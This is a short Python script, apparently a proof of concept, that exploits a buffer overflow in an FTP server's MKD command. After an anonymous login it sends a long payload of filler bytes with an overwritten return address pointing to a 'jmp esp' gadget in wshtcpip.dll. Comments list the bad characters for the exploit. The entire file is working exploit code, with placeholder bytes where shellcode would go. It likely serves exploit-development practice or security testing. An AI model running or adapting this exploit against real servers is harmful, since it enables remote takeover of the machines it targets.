#!/usr/bin/python

import socket
import sys

HOST = "192.168.139.128"
PORT = 21
# ------------------------------------
# Badchars: \x00\x0A\x0D 
# 0x71a91c8b : jmp esp | wshtcpip.dll
# ------------------------------------
evil = "A"*247 + "\x8b\x1c\xa9\x71" + "C"*749

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.recv(1024)
s.close()